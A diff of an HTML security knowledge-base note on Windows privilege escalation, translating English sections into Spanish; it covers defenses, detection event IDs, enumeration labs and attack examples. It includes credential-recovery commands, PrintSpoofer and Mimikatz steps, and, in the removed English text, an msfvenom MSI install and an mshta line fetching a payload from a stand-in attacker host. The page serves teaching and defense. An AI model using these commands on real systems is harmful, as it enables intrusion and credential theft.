+<li><strong>Admin local / <code>SYSTEM</code> en una workstation.</strong> Resultado directo de la mayoría de las primitivas. Habilita dump de LSASS, persistencia vía scheduled task, manipulación de registro, intentos de evasión de EDR.</li>
+<li><strong>Extracción de credenciales cacheadas → movimiento lateral AD.</strong> <code>SYSTEM</code> en una workstation donde se logueó un domain admin = las credenciales del domain admin en LSASS. Esta es <em>la</em> cadena canónica de una workstation de usuario a compromiso de dominio. Ver <a href="tier-zero-administration-and-paw.html">Administración Tier 0</a> para la ruptura estructural de esta cadena.</li>
+<li><strong>Contexto de service account → compromiso de SQL o tier de app.</strong> La privesc en un servidor de aplicaciones (IIS, SQL Server, Exchange) produce contexto de service account que frecuentemente tiene acceso de linked-server o relación de confianza a otros hosts Tier 1.</li>
+<li><strong>Persistencia y sigilo.</strong> Admin local habilita instalación de servicio, scheduled tasks, persistencia vía registry-run, y (con <code>SYSTEM</code>) manipulación de agentes de telemetría/EDR.</li>
 </ul>
-<h2 id="detection-and-defense">Detection and defense</h2>
-<p>Ordered by effectiveness:</p>
-<ol>
-<li>
-<p><strong>LAPS for local-admin password rotation.</strong>
-   Windows LAPS (built into Windows 11 / Server 2022+, replacing legacy MS LAPS) rotates local Administrator passwords per-host to unique randomized values stored in AD. Eliminates the "one local admin hash = whole fleet" reuse failure mode that gives privesc its biggest blast radius.</p>
-</li>
-<li>
-<p><strong>Credential Guard on every endpoint.</strong>
-   Isolates LSASS in Virtual Secure Mode (VSM). Makes in-memory hash extraction fail. The privesc primitive that yielded <code>SYSTEM</code> still succeeds; the <em>value</em> of <code>SYSTEM</code> (extracted hashes) collapses. See <a href="pass-the-hash-and-ntlm-credential-reuse.html">Pass-the-Hash</a> §Detection-and-defense item 2.</p>
-</li>
-<li>
-<p><strong>Audit and remediate the canonical privesc primitives.</strong>
-   Quarterly scan with <code>accesschk.exe</code>, <code>PowerUp.ps1</code> in audit mode, or commercial equivalents:
-   - Weak service permissions (<code>accesschk -uwcqv "Users" *</code>)
-   - Unquoted service paths (<code>wmic service get name,pathname /format:list | findstr /v "\""</code>)
-   - AlwaysInstallElevated registry state (should be <code>0</code> or absent)
-   - Writable directories on <code>PATH</code>
-   - Scheduled tasks with weak ACLs
-   Most findings are 5-minute fixes once identified. The discipline is finding them, not fixing them.</p>
-</li>
-<li>
-<p><strong>AppLocker or WDAC executable allowlisting.</strong>
-   Blocks dropped binaries from running entirely. Defeats most tool-based privesc primitives. Operators shift to LOLBins, but the bar is higher. Most environments deploy this for workstations and lock down servers more aggressively.</p>
-</li>
-<li>
-<p><strong>Restricted admin mode and Just-Enough-Administration (JEA).</strong>
-   For remote administration: <code>mstsc /restrictedadmin</code> does not cache credentials on the target. JEA constrains PowerShell sessions to specific cmdlets/parameters. Both reduce the "admin logged in, credentials cached, workstation compromised" chain.</p>
-</li>
-<li>
-<p><strong>Detection on the canonical Event IDs.</strong>
-   See <a href="../detection-engineering/windows-event-logs.html">Windows Event Logs</a> for the full reference. The privesc-relevant rules:
-   - <strong>4697</strong> (service installation) from a non-standard parent process
-   - <strong>4698 / 4702</strong> (scheduled task created / updated) from unusual sources
-   - <strong>4672</strong> (special privileges assigned) for non-baseline user accounts
-   - <strong>4673</strong> (sensitive privilege use — <code>SeImpersonatePrivilege</code> etc.) outside of baseline service accounts
-   - <strong>4624 LogonType=9</strong> (NewCredentials — the Potato family's signature)
-   - <strong>4688</strong> with parent-process anomalies (a command shell parented to a service binary)
-   - Sysmon Event 1 (process creation) + Event 3 (network) + Event 7 (image load) for the dropped-binary case</p>
-</li>
-</ol>
-<h3 id="what-does-not-work-as-a-primary-defense">What does not work as a primary defense</h3>
+<h2 id="deteccion-y-defensa">Detección y defensa</h2>
+<p>Ordenado por efectividad:</p>
+<p>1. <strong>LAPS para rotación de contraseña del admin local.</strong> Windows LAPS (incorporado en Windows 11 / Server 2022+) rota las contraseñas del Administrador local por-host a valores únicos aleatorios almacenados en AD. Elimina el modo de falla de &quot;un hash de admin local = toda la flota&quot;.</p>
+<p>2. <strong>Credential Guard en cada endpoint.</strong> Aísla LSASS en Virtual Secure Mode (VSM). Hace que la extracción de hashes en memoria falle. La primitiva de privesc que produjo <code>SYSTEM</code> sigue teniendo éxito; el <em>valor</em> de <code>SYSTEM</code> (hashes extraídos) colapsa.</p>
+<p>3. <strong>Auditar y remediar las primitivas canónicas de privesc.</strong> Escaneo trimestral con <code>accesschk.exe</code>, <code>PowerUp.ps1</code> en modo auditoría, o equivalentes comerciales:</p>
 <ul>
-<li><strong>Trusting that "non-admin users can't break out".</strong> Default Windows ships with multiple privesc primitives available to standard users out of the box (unquoted-paths, writable PATH directories with old software). Audit, don't assume.</li>
-<li><strong>Relying on UAC alone.</strong> UAC reduces casual privilege use but most modern UAC bypasses are not vulnerabilities — they're documented auto-elevation behaviors. Raise the slider to "Always notify" and prefer architectural controls.</li>
-<li><strong>Patching only.</strong> Most privesc primitives are configuration, not CVEs. Patches don't fix weak service ACLs or unquoted paths.</li>
-<li><strong>Antivirus signature blocking.</strong> Named privesc tools are detected; renamed or recompiled tools are not. Behavioral detection (the Event-ID rules above) is the durable layer.</li>
-<li><strong>Believing "we have EDR".</strong> EDR catches a meaningful fraction; the privesc surface is broader than EDR rule coverage. Audit-and-remediate is the structural fix.</li>
+<li>Permisos de servicio débiles (<code>accesschk -uwcqv &quot;Users&quot; *</code>)</li>
+<li>Rutas de servicio sin comillas (<code>wmic service get name,pathname /format:list | findstr /v &quot;\&quot;&quot;</code>)</li>
+<li>Estado del registro AlwaysInstallElevated (debería ser <code>0</code> o ausente)</li>
+<li>Directorios escribibles en <code>PATH</code></li>
+<li>Scheduled tasks con ACLs débiles</li>
 </ul>
-<h2 id="practical-labs">Practical labs</h2>
-<p>Run only against owned lab environments or authorized engagements.</p>
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 1 — Inventory current privileges and group memberships.</span>
-<span class="n">whoami</span> <span class="p">/</span><span class="n">priv</span>
-<span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span>
-<span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span>
-<span class="n">net</span> <span class="n">user</span> <span class="nv">$env:USERNAME</span>
-<span class="c"># Look for SeImpersonatePrivilege, SeAssignPrimaryToken, SeBackupPrivilege —</span>
-<span class="c"># any of these usually means a single-step path to SYSTEM is available.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 2 — Find weak service permissions.</span>
-<span class="c"># Requires Sysinternals accesschk.exe in the lab.</span>
-<span class="p">.\</span><span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="n">-uwcqv</span> <span class="s2">&quot;Users&quot;</span> <span class="p">*</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
-<span class="p">.\</span><span class="n">accesschk</span><span class="p">.</span><span class="n">exe</span> <span class="n">-uwcqv</span> <span class="s2">&quot;Authenticated Users&quot;</span> <span class="p">*</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span>
-<span class="c"># Each result is a service where the listed group can modify configuration.</span>
-<span class="c"># Cross-reference against service binary writability:</span>
-<span class="nb">Get-WmiObject</span> <span class="n">Win32_Service</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span>
-    <span class="nv">$path</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-replace</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span> <span class="o">-replace</span> <span class="s1">&#39; .*&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span>
-    <span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
-        <span class="nv">$acl</span> <span class="p">=</span> <span class="nb">Get-Acl</span> <span class="nv">$path</span>
-        <span class="nv">$writable</span> <span class="p">=</span> <span class="nv">$acl</span><span class="p">.</span><span class="n">Access</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span>
-            <span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-match</span> <span class="s1">&#39;Users|Everyone|Authenticated&#39;</span> <span class="o">-and</span>
-            <span class="nv">$_</span><span class="p">.</span><span class="n">FileSystemRights</span> <span class="o">-match</span> <span class="s1">&#39;Write|Modify|FullControl&#39;</span>
-        <span class="p">}</span>
-        <span class="k">if</span> <span class="p">(</span><span class="nv">$writable</span><span class="p">)</span> <span class="p">{</span>
-            <span class="s2">&quot;{0}  -&gt;  writable by: {1}&quot;</span> <span class="o">-f</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span> <span class="p">(</span><span class="nv">$writable</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="n">-join</span> <span class="s1">&#39;, &#39;</span><span class="p">)</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 3 — Hunt unquoted service paths.</span>
-<span class="nb">Get-WmiObject</span> <span class="n">Win32_Service</span> <span class="p">|</span>
-    <span class="nb">Where-Object</span> <span class="p">{</span>
-        <span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-notmatch</span> <span class="s1">&#39;^&quot;&#39;</span> <span class="o">-and</span>
-        <span class="nv">$_</span><span class="p">.</span><span class="n">PathName</span> <span class="o">-match</span> <span class="s1">&#39; &#39;</span>
-    <span class="p">}</span> <span class="p">|</span>
-    <span class="nb">Select-Object</span> <span class="n">Name</span><span class="p">,</span> <span class="n">PathName</span><span class="p">,</span> <span class="n">StartName</span><span class="p">,</span> <span class="n">StartMode</span>
-<span class="c"># Each result is a candidate unquoted-path privesc target.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 4 — Check AlwaysInstallElevated state.</span>
-<span class="nv">$hklm</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="s1">&#39;HKLM:\Software\Policies\Microsoft\Windows\Installer&#39;</span> <span class="n">-EA</span> <span class="n">0</span><span class="p">).</span><span class="n">AlwaysInstallElevated</span>
-<span class="nv">$hkcu</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="s1">&#39;HKCU:\Software\Policies\Microsoft\Windows\Installer&#39;</span> <span class="n">-EA</span> <span class="n">0</span><span class="p">).</span><span class="n">AlwaysInstallElevated</span>
-<span class="s2">&quot;HKLM AlwaysInstallElevated: $hklm&quot;</span>
-<span class="s2">&quot;HKCU AlwaysInstallElevated: $hkcu&quot;</span>
-<span class="c"># Both = 1 means any user can install MSI as SYSTEM. Build a payload MSI with msfvenom and `msiexec /quiet /i evil.msi`.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 5 — Recover stored credentials.</span>
-<span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>                                         <span class="c"># Credential Manager entries</span>
-<span class="nb">Get-ChildItem</span> <span class="s1">&#39;C:\Windows\Panther\Unattend.xml&#39;</span><span class="p">,</span><span class="s1">&#39;C:\sysprep.inf&#39;</span> <span class="n">-EA</span> <span class="n">0</span>
-<span class="n">reg</span> <span class="n">query</span> <span class="s1">&#39;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#39;</span> <span class="n">2</span><span class="p">&gt;</span><span class="nv">$null</span> <span class="p">|</span>
-    <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s1">&#39;DefaultUserName DefaultPassword AutoAdminLogon&#39;</span>
-<span class="c"># Any hit on stored AutoLogon credentials = direct credential recovery.</span>
-</code></pre></div>
-
-<div class="codehilite"><pre><span></span><code><span class="c"># Lab 6 — Detect canonical privesc primitives (defender side).</span>
-<span class="c"># After running the labs above in a controlled lab, query Windows Event Logs:</span>
-<span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span><span class="n">LogName</span><span class="p">=</span><span class="s1">&#39;Security&#39;</span><span class="p">;</span> <span class="n">ID</span><span class="p">=</span><span class="n">4697</span><span class="p">}</span> <span class="n">-MaxEvents</span> <span class="n">50</span> <span class="p">|</span>
-    <span class="nb">Select-Object</span> <span class="n">TimeCreated</span><span class="p">,</span>
-        <span class="p">@{</span><span class="n">n</span><span class="p">=</span><span class="s1">&#39;User&#39;</span><span class="p">;</span><span class="n">e</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="n">1</span><span class="p">].</span><span class="n">Value</span><span class="p">}},</span>
-        <span class="p">@{</span><span class="n">n</span><span class="p">=</span><span class="s1">&#39;ServiceName&#39;</span><span class="p">;</span><span class="n">e</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Properties</span><span class="p">[</span><span class="n">4</span><span class="p">].</span><span class="n">Value</span><span class="p">}}</span>
-<span class="c"># Event 4697 = a service was installed. From a user context, this is a high-fidelity privesc indicator.</span>
-<span class="c"># See &lt;a href=&quot;../detection-engineering/windows-event-logs.html&quot;&gt;Windows Event Logs&lt;/a&gt; for the full Event-ID reference.</span>
-</code></pre></div>
-
-<h2 id="practical-examples">Practical examples</h2>
+<p>4. <strong>AppLocker o WDAC allowlisting de ejecutables.</strong> Bloquea binarios soltados de ejecutar completamente. Derrota la mayoría de las primitivas de privesc basadas en herramientas.</p>
+<p>5. <strong>Restricted admin mode y Just-Enough-Administration (JEA).</strong> Para administración remota: <code>mstsc /restrictedadmin</code> no cachea credenciales en el objetivo. JEA restringe las sesiones PowerShell a cmdlets/parámetros específicos.</p>
+<p>6. <strong>Detección en los Event IDs canónicos.</strong> Ver <a href="../detection-engineering/windows-event-logs.html">Windows Event Logs</a> para la referencia completa. Las reglas relevantes para privesc:</p>
 <ul>
-<li><strong>IIS app pool → SYSTEM via PrintSpoofer.</strong> Operator gains code execution as <code>IIS APPPOOL\DefaultAppPool</code>. <code>whoami /priv</code> shows <code>SeImpersonatePrivilege</code>. <code>PrintSpoofer.exe -i -c cmd.exe</code> triggers a coerced authentication via the Print Spooler service and impersonates <code>SYSTEM</code>. Total elapsed time from web-app foothold to <code>SYSTEM</code>: under a minute.</li>
-<li><strong>Unquoted service path on a legacy 2014-era application.</strong> Service binary is <code>C:\Program Files\Acme\My Service\service.exe</code>, installed without quoting. Users have write access to <code>C:\</code>. Operator drops <code>C:\Program.exe</code>, restarts the service, gains <code>SYSTEM</code>. Fix is one quote character in the <code>ImagePath</code> registry value.</li>
-<li><strong>Stored AutoLogon credential.</strong> Workstation built from a 2018 imaging script that set <code>DefaultPassword</code> in the Winlogon registry key. Anyone with read access (including the local user) recovers the build-time admin password. Same password is in use on 1,200 other workstations in the fleet. LAPS would eliminate the reuse.</li>
-<li><strong>Domain admin RDP'd to a workstation.</strong> Helpdesk member logged into a workstation as domain admin to fix something three months ago. <code>runas</code> cached the credential. Operator compromises the workstation, dumps LSASS with Mimikatz, recovers the cached domain admin hash, performs DCSync. The full chain Tier 0 administration is designed to prevent — see <a href="tier-zero-administration-and-paw.html">Tier 0 Administration</a>.</li>
-<li><strong>AppLocker bypass via LOLBin.</strong> Hardened environment blocks all unsigned executables. Operator uses <code>mshta.exe http://attacker/payload.hta</code> to execute a signed-Microsoft-binary that runs attacker content. AppLocker default policies allow signed Microsoft binaries; modern policies must explicitly block the LOLBin set.</li>
+<li><strong>4697</strong> (instalación de servicio) desde un proceso padre no estándar</li>
+<li><strong>4698 / 4702</strong> (scheduled task creado / actualizado) desde fuentes inusuales</li>
+<li><strong>4672</strong> (privilegios especiales asignados) para cuentas de usuario no baseline</li>
+<li><strong>4673</strong> (uso de privilegio sensible — <code>SeImpersonatePrivilege</code> etc.) fuera de service accounts baseline</li>
+<li><strong>4624 LogonType=9</strong> (NewCredentials — la firma de la familia Potato)</li>
+<li><strong>4688</strong> con anomalías en el proceso padre (una shell de comandos parenteada a un binario de servicio)</li>
 </ul>
-<h2 id="related-notes">Related notes</h2>
+<h3 id="que-no-funciona-como-defensa-primaria">Qué no funciona como defensa primaria</h3>
 <ul>
-<li><a href="kerberoasting.html">kerberoasting</a> — frequent precursor when the operator has a domain user credential but not local admin; Kerberoasting yields a service-account password that often is local admin on its host.</li>
-<li><a href="as-rep-roasting.html">as-rep-roasting</a> — same pattern from the pre-foothold position.</li>
-<li><a href="pass-the-hash-and-ntlm-credential-reuse.html">pass-the-hash-and-ntlm-credential-reuse</a> — the canonical follow-up: privesc yields LSASS access, LSASS yields hashes, hashes yield lateral movement.</li>
-<li><a href="bloodhound-attack-path-analysis.html">bloodhound-attack-path-analysis</a> — BloodHound's <code>AdminTo</code> and <code>CanRDP</code> edges identify <em>which</em> Windows hosts an operator should privesc on to gain the most onward reach.</li>
-<li><a href="tier-zero-administration-and-paw.html">tier-zero-administration-and-paw</a> — the structural defense that makes the privesc → cached-credential → AD chain impossible.</li>
-<li><a href="dcsync-and-ntdsdit-extraction.html">dcsync-and-ntdsdit-extraction</a> — typical endgame two hops downstream of Windows privesc on a workstation hosting a Tier 0 cached credential.</li>
-<li><a href="gmsa-and-modern-service-account-hardening.html">gmsa-and-modern-service-account-hardening</a> — defender's mirror for the "service account in Administrators" misconfiguration that gives so many privesc paths their power.</li>
-<li><a href="../linux-privilege-escalation/index.html">Linux Privilege Escalation Index</a> — the Linux counterpart branch; sibling discipline with a different primitive landscape.</li>
-<li><a href="../detection-engineering/windows-event-logs.html">Windows Event Logs</a> — the canonical reference for the Event IDs cited in the Detection section.</li>
-<li><a href="../detection-engineering/behavioral-detection-vs-signature-detection.html">Behavioral vs Signature Detection</a> — privesc detection lives in process-tree behavior, not in tool names.</li>
-<li><a href="../foundations/cia-triad-and-what-it-actually-decides.html">CIA triad</a> — privesc is an authorization-integrity breach; the user's authentication identity is intact, the authorization boundary is broken.</li>
+<li><strong>Confiar en que &quot;los usuarios no-admin no pueden escapar.&quot;</strong> Windows por defecto incluye múltiples primitivas de privesc disponibles para usuarios estándar out of the box. Auditá, no asumas.</li>
+<li><strong>Depender solo de UAC.</strong> La mayoría de los bypasses modernos de UAC no son vulnerabilidades — son comportamientos de auto-elevación documentados.</li>
+<li><strong>Solo parchear.</strong> La mayoría de las primitivas de privesc son configuración, no CVEs.</li>
+<li><strong>Firma de antivirus.</strong> Las herramientas de privesc nombradas son detectadas; las herramientas renombradas o recompiladas no lo son.</li>
 </ul>
-<h3 id="suggested-future-atomic-notes">Suggested future atomic notes</h3>
+<h2 id="labs-practicos">Labs prácticos</h2>
+<p>Ejecutar solo contra entornos lab propios o engagements autorizados.</p>
+<div class="codehilite"><pre><span></span><code># Lab 1 — Inventariar privilegios actuales y membresías de grupo.
+whoami /priv
+whoami /groups
+net localgroup Administrators
+net user $env:USERNAME
+# Buscar SeImpersonatePrivilege, SeAssignPrimaryToken, SeBackupPrivilege.
+</code></pre></div>
+<div class="codehilite"><pre><span></span><code># Lab 2 — Encontrar permisos de servicio débiles.
+.\accesschk.exe -uwcqv &quot;Users&quot; * 2&gt;$null
+.\accesschk.exe -uwcqv &quot;Authenticated Users&quot; * 2&gt;$null
+Get-WmiObject Win32_Service | ForEach-Object {
+    $path = $_.PathName -replace &#x27;&quot;&#x27;, &#x27;&#x27; -replace &#x27; .*&#x27;, &#x27;&#x27;
+    if (Test-Path $path) {
+        $acl = Get-Acl $path
+        $writable = $acl.Access | Where-Object {
+            $_.IdentityReference -match &#x27;Users|Everyone|Authenticated&#x27; -and
+            $_.FileSystemRights -match &#x27;Write|Modify|FullControl&#x27;
+        }
+        if ($writable) {
+            &quot;{0}  -&gt;  escribible por: {1}&quot; -f $_.Name, ($writable.IdentityReference -join &#x27;, &#x27;)
+        }
+    }
+}
+</code></pre></div>
+<div class="codehilite"><pre><span></span><code># Lab 3 — Buscar rutas de servicio sin comillas.
+Get-WmiObject Win32_Service |
+    Where-Object {
+        $_.PathName -notmatch &#x27;^&quot;&#x27; -and
+        $_.PathName -match &#x27; &#x27;
+    } |
+    Select-Object Name, PathName, StartName, StartMode
+</code></pre></div>
+<div class="codehilite"><pre><span></span><code># Lab 4 — Verificar el estado de AlwaysInstallElevated.
+$hklm = (Get-ItemProperty &#x27;HKLM:\Software\Policies\Microsoft\Windows\Installer&#x27; -EA 0).AlwaysInstallElevated
+$hkcu = (Get-ItemProperty &#x27;HKCU:\Software\Policies\Microsoft\Windows\Installer&#x27; -EA 0).AlwaysInstallElevated
+&quot;HKLM AlwaysInstallElevated: $hklm&quot;
+&quot;HKCU AlwaysInstallElevated: $hkcu&quot;
+# Ambos = 1 significa que cualquier usuario puede instalar MSI como SYSTEM.
+</code></pre></div>
+<div class="codehilite"><pre><span></span><code># Lab 5 — Recuperar credenciales almacenadas.
+cmdkey /list
+Get-ChildItem &#x27;C:\Windows\Panther\Unattend.xml&#x27;,&#x27;C:\sysprep.inf&#x27; -EA 0
+reg query &#x27;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#x27; 2&gt;$null |
+    findstr /i &#x27;DefaultUserName DefaultPassword AutoAdminLogon&#x27;
+</code></pre></div>
+<div class="codehilite"><pre><span></span><code># Lab 6 — Detectar primitivas canónicas de privesc (lado defensor).
+Get-WinEvent -FilterHashtable @{LogName=&#x27;Security&#x27;; ID=4697} -MaxEvents 50 |
+    Select-Object TimeCreated,
+        @{n=&#x27;User&#x27;;e={$_.Properties[1].Value}},
+        @{n=&#x27;ServiceName&#x27;;e={$_.Properties[4].Value}}
+# Event 4697 = un servicio fue instalado. Desde un contexto de usuario, este es un indicador de privesc de alta fidelidad.
+</code></pre></div>
+<h2 id="ejemplos-practicos">Ejemplos prácticos</h2>
 <ul>
-<li><span class="unresolved-link" title="Unpublished or unresolved: token-impersonation-and-the-potato-family">token-impersonation-and-the-potato-family</span> — deep dive on <code>SeImpersonatePrivilege</code> abuse with the Potato lineage (Hot/Rotten/Juicy/PrintSpoofer/Rogue/God/Efs).</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: uac-bypasses-and-auto-elevated-binaries">uac-bypasses-and-auto-elevated-binaries</span> — the fodhelper / computerdefaults / sdclt class and why UAC is documented behavior, not a security boundary.</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: lolbas-living-off-the-land-binaries">lolbas-living-off-the-land-binaries</span> — the signed-Microsoft-binaries-as-execution-vectors landscape.</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: applocker-and-wdac-deployment-patterns">applocker-and-wdac-deployment-patterns</span> — defender-side allowlisting policy design.</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: laps-and-local-admin-password-rotation">laps-and-local-admin-password-rotation</span> — already seeded from <a href="pass-the-hash-and-ntlm-credential-reuse.html">PtH</a>; the defensive answer to local-admin reuse.</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: sysmon-configuration-and-tuning">sysmon-configuration-and-tuning</span> — the SwiftOnSecurity / Olaf Hartong config patterns for detection of privesc telemetry.</li>
-<li><span class="unresolved-link" title="Unpublished or unresolved: detect-windows-local-privilege-escalation">detect-windows-local-privilege-escalation</span> — defender playbook pair for this note.</li>
+<li><strong>App pool IIS → SYSTEM vía PrintSpoofer.</strong> El operador gana ejecución de código como <code>IIS APPPOOL\DefaultAppPool</code>. <code>whoami /priv</code> muestra <code>SeImpersonatePrivilege</code>. <code>PrintSpoofer.exe -i -c cmd.exe</code> desencadena una autenticación forzada vía el servicio Print Spooler e impersona <code>SYSTEM</code>. Tiempo total desde foothold de app web hasta <code>SYSTEM</code>: menos de un minuto.</li>
+<li><strong>Ruta de servicio sin comillas en una aplicación legacy de 2014.</strong> El binario del servicio es <code>C:\Program Files\Acme\My Service\service.exe</code>, instalado sin comillas. Los usuarios tienen acceso de escritura a <code>C:\</code>. El operador deposita <code>C:\Program.exe</code>, reinicia el servicio, gana <code>SYSTEM</code>. La corrección es un carácter de comilla en el valor del registro <code>ImagePath</code>.</li>
+<li><strong>Credencial AutoLogon almacenada.</strong> Workstation construida desde un script de imaging de 2018 que configuró <code>DefaultPassword</code> en la clave del registro Winlogon. Cualquiera con acceso de lectura (incluyendo el usuario local) recupera la contraseña del admin en el momento de construcción. La misma contraseña está en uso en 1.200 otras workstations en la flota. LAPS eliminaría la reutilización.</li>
+<li><strong>Domain admin hizo RDP a una workstation.</strong> Un miembro del helpdesk se logueó a una workstation como domain admin para arreglar algo hace tres meses. <code>runas</code> cacheó la credencial. El operador compromete la workstation, dumpea LSASS con Mimikatz, recupera el hash del domain admin cacheado, realiza DCSync. La cadena completa que la administración Tier 0 está diseñada para prevenir — ver <a href="tier-zero-administration-and-paw.html">Administración Tier 0</a>.</li>
 </ul>
-<h2 id="references">References</h2>
+<h2 id="notas-relacionadas">Notas relacionadas</h2>
 <ul>
-<li><strong>Foundational:</strong> MITRE ATT&amp;CK TA0004 — Privilege Escalation (tactic) — https://attack.mitre.org/tactics/TA0004/</li>
-<li><strong>Research / Deep Dive:</strong> Sean Metcalf (ADSecurity.org) — Local Administrator Password Solution and Windows Privilege Escalation Patterns — https://adsecurity.org/?p=4063</li>
-<li><strong>Official Tool Docs:</strong> Microsoft Sysinternals Suite (accesschk, autoruns, procmon, sysmon) — https://learn.microsoft.com/en-us/sysinternals/</li>
+<li><a href="kerberoasting.html">kerberoasting</a> — precursor frecuente cuando el operador tiene una credencial de usuario de dominio pero no admin local.</li>
+<li><a href="pass-the-hash-and-ntlm-credential-reuse.html">pass-the-hash-and-ntlm-credential-reuse</a> — el seguimiento canónico: privesc produce acceso a LSASS, LSASS produce hashes, hashes producen movimiento lateral.</li>
+<li><a href="bloodhound-attack-path-analysis.html">bloodhound-attack-path-analysis</a> — las aristas <code>AdminTo</code> y <code>CanRDP</code> de BloodHound identifican en qué hosts Windows debería hacer privesc un operador para ganar el mayor alcance hacia adelante.</li>
+<li><a href="tier-zero-administration-and-paw.html">tier-zero-administration-and-paw</a> — la defensa estructural que hace imposible la cadena privesc → credencial cacheada → AD.</li>
+<li><a href="dcsync-and-ntdsdit-extraction.html">dcsync-and-ntdsdit-extraction</a> — endgame típico dos hops downstream de privesc de Windows en una workstation que aloja una credencial Tier 0 cacheada.</li>
+<li><a href="gmsa-and-modern-service-account-hardening.html">gmsa-and-modern-service-account-hardening</a> — el espejo defensivo para la mala configuración de &quot;service account en Administrators&quot; que da poder a tantas rutas de privesc.</li>
+<li><a href="../detection-engineering/windows-event-logs.html">Windows Event Logs</a> — la referencia canónica para los Event IDs citados en la sección de Detección.</li>
+</ul>
+<h2 id="referencias">Referencias</h2>
+<ul>
+<li><strong>Fundamental:</strong> MITRE ATT&amp;CK TA0004 — Privilege Escalation (táctica) — https://attack.mitre.org/tactics/TA0004/</li>
+<li><strong>Investigación / Deep Dive:</strong> Sean Metcalf (ADSecurity.org) — Local Administrator Password Solution and Windows Privilege Escalation Patterns — https://adsecurity.org/?p=4063</li>
+<li><strong>Docs Oficiales:</strong> Microsoft Sysinternals Suite (accesschk, autoruns, procmon, sysmon) — https://learn.microsoft.com/en-us/sysinternals/</li>
 <li><strong>Hardening:</strong> Microsoft Learn — Securing privileged access in Windows — https://learn.microsoft.com/en-us/security/privileged-access-workstations/overview</li>
 </ul>
 <nav class="branch-nav" aria-label="Within this branch"><a class="branch-nav-link prev" href="tier-zero-administration-and-paw.html"><span class="nav-dir">← Previous</span><strong>Tier 0 Administration and Privileged Access Workstations</strong></a></nav>
@@ -716,24 +664,24 @@
 </article>
 </main>
 <aside class="toc" aria-label="En esta página"><div class="toc-inner"><h2>En esta página</h2>
-<a class="toc-level-2" href="#definition">Definition</a>
-<a class="toc-level-2" href="#why-it-matters">Why it matters</a>
-<a class="toc-level-2" href="#how-it-works">How it works</a>
-<a class="toc-level-2" href="#techniques-patterns">Techniques / patterns</a>
-<a class="toc-level-3" href="#the-privesc-primitive-landscape">The privesc-primitive landscape</a>
-<a class="toc-level-3" href="#patterns">Patterns</a>
-<a class="toc-level-2" href="#variants-and-bypasses">Variants and bypasses</a>
-<a class="toc-level-3" href="#1-service-control-file-permission-primitives">1. Service-control / file-permission primitives</a>
-<a class="toc-level-3" href="#2-token-privilege-primitives">2. Token-privilege primitives</a>
-<a class="toc-level-3" href="#3-credential-recovery-primitives">3. Credential-recovery primitives</a>
-<a class="toc-level-3" href="#4-kernel-uac-bypass-primitives">4. Kernel / UAC bypass primitives</a>
-<a class="toc-level-2" href="#impact">Impact</a>
-<a class="toc-level-2" href="#detection-and-defense">Detection and defense</a>
-<a class="toc-level-3" href="#what-does-not-work-as-a-primary-defense">What does not work as a primary defense</a>
-<a class="toc-level-2" href="#practical-labs">Practical labs</a>
-<a class="toc-level-2" href="#practical-examples">Practical examples</a>
-<a class="toc-level-2" href="#related-notes">Related notes</a>
-<a class="toc-level-3" href="#suggested-future-atomic-notes">Suggested future atomic notes</a>
+<a class="toc-level-2" href="#definicion">Definición</a>
+<a class="toc-level-2" href="#por-que-importa">Por qué importa</a>
+<a class="toc-level-2" href="#como-funciona">Cómo funciona</a>
+<a class="toc-level-2" href="#tecnicas-patrones">Técnicas / patrones</a>
+<a class="toc-level-3" href="#el-panorama-de-primitivas-de-privesc">El panorama de primitivas de privesc</a>
+<a class="toc-level-3" href="#patrones">Patrones</a>
+<a class="toc-level-2" href="#variantes-y-bypasses">Variantes y bypasses</a>
+<a class="toc-level-3" href="#1-primitivas-de-control-de-servicio-permisos-de-archivo">1. Primitivas de control de servicio / permisos de archivo</a>
+<a class="toc-level-3" href="#2-primitivas-de-privilegio-de-token">2. Primitivas de privilegio de token</a>
+<a class="toc-level-3" href="#3-primitivas-de-recuperacion-de-credenciales">3. Primitivas de recuperación de credenciales</a>
